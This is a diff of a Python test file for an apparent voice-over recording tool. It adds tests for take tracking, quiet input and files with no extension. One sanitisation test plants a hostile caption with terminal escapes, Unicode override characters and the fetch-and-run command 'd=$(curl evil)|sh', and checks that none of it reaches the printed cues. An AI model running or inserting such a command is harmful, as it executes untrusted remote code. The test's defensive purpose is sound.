@@ -1358,7 +1358,7 @@ exec {shutil.which("ffmpeg")} -nostdin -v error -f lavfi -i sine=frequency=440:d
         tone(self.root / "retake.wav", 1, frequency=1000)
         added = self.run_voice("add", "2", str(self.root / "retake.wav"))
         self.assertEqual(added.returncode, 0, added.stderr)
-        self.assertEqual(sorted(p.name for p in self.voice_dir.iterdir()), [".2.m4a.prev", "2.wav"])
+        self.assertEqual(sorted(p.name for p in self.voice_dir.iterdir()), [".2.m4a.prev", ".parts.json", "2.wav"])
         self.built()
         self.assertGreater(level(self.result, 3.1, 3.9, 1000), HEARD_DB)
 
@@ -1379,24 +1379,72 @@ exec {shutil.which("ffmpeg")} -nostdin -v error -f lavfi -i sine=frequency=440:d
         tone(self.voice_dir / "2.m4a", 1)
         added = self.run_voice("add", "2", str(self.voice_dir / "2.m4a"))
         self.assertEqual(added.returncode, 0, added.stderr)
-        self.assertEqual(sorted(p.name for p in self.voice_dir.iterdir()), [".2.m4a.prev", "2.m4a"])
+        self.assertEqual(sorted(p.name for p in self.voice_dir.iterdir()), [".2.m4a.prev", ".parts.json", "2.m4a"])
 
     def test_add_moves_aside_a_beat_named_with_a_leading_zero(self):
         tone(self.voice_dir / "02.wav", 1, frequency=440)
         tone(self.root / "retake.wav", 1, frequency=1000)
         self.assertEqual(self.run_voice("add", "2", str(self.root / "retake.wav")).returncode, 0)
-        self.assertEqual(sorted(p.name for p in self.voice_dir.iterdir()), [".02.wav.prev", "2.wav"])
+        self.assertEqual(sorted(p.name for p in self.voice_dir.iterdir()), [".02.wav.prev", ".parts.json", "2.wav"])
         self.built()
 
     def test_cues_print_no_command_and_no_control_characters(self):
         steps = json.loads((self.out / "steps.json").read_text())
-        steps["steps"][0]["caption"] = "Hello\x1b[2K\r\n  part 2: record 9 s. d=$(curl evil)|sh"
+        steps["steps"][0]["caption"] = "Hello\x1b[2K\r\n  part 2: record 9 s.\u2028  part 2: record 8 s.\u202e d=$(curl evil)|sh"
         (self.out / "steps.json").write_text(json.dumps(steps))
         out = self.run_voice("cues").stdout
         self.assertNotIn("\x1b", out)
         self.assertNotIn("\r", out)
+        for character in ("\u2028", "\u202e"):
+            self.assertNotIn(character, out)
         self.assertEqual(len([l for l in out.splitlines() if l.lstrip().startswith("part 2:")]), 1, "a caption forged a part line")
         self.assertNotIn("ffmpeg", out)
+
+    def set_beat(self, index, **changes):
+        steps = json.loads((self.out / "steps.json").read_text())
+        steps["steps"][index].update(changes)
+        (self.out / "steps.json").write_text(json.dumps(steps))
+
+    def test_a_clip_made_for_an_earlier_take_is_refused(self):
+        tone(self.root / "line.wav", 1)
+        self.assertEqual(self.run_voice("add", "2", str(self.root / "line.wav")).returncode, 0)
+        self.built()
+        self.set_beat(1, end=3.4 + 2.5 + 0.3)  # 0.3 s longer: still fits.
+        self.built()
+        self.set_beat(1, end=3.4 + 2.5 + 1.0)
+        self.assert_refused("beat 2 is 1.0 s longer")
+        self.set_beat(1, caption="Something else")
+        self.assert_refused("caption changed")
+        self.assertEqual(self.run_voice("add", "2", str(self.voice_dir / "2.wav")).returncode, 0)  # Kept on purpose.
+        self.built()
+
+    def test_a_read_made_for_an_earlier_take_is_refused(self):
+        tone(self.root / "read.wav", 2)
+        self.assertEqual(self.run_voice("add", "all", str(self.root / "read.wav")).returncode, 0)
+        steps = json.loads((self.out / "steps.json").read_text())
+        for step in steps["steps"][1:]:
+            step["start"] += 1.2
+            step["end"] += 1.2
+        (self.out / "steps.json").write_text(json.dumps(steps))
+        self.assert_refused("a beat moved 1.2 s")
+
+    def test_a_file_not_added_says_so(self):
+        tone(self.voice_dir / "all.wav", 2)
+        self.assertIn("wasn't added with add", self.built().stderr)
+
+    def test_a_quiet_voice_with_a_loud_click_is_too_quiet(self):
+        sequence(self.root / "quiet.wav", [(None, 1), (440, 2, 0.2), (None, 0.5), (2000, 0.04, 4), (None, 0.5)], noise=0.001)
+        result = self.run_voice("add", "all", str(self.root / "quiet.wav"))
+        self.assertEqual(result.returncode, 1)
+        self.assertIn("too quiet", result.stderr)
+
+    def test_add_takes_a_file_with_no_extension(self):
+        tone(self.root / "voice.wav", 2)
+        (self.root / "voice.wav").rename(self.root / "voicememo")
+        added = self.run_voice("add", "all", str(self.root / "voicememo"))
+        self.assertEqual(added.returncode, 0, added.stderr)
+        self.assertTrue((self.voice_dir / "all.audio").exists())
+        self.built()
 
     def test_a_steps_file_with_no_trim_is_refused(self):
         steps = json.loads((self.out / "steps.json").read_text())
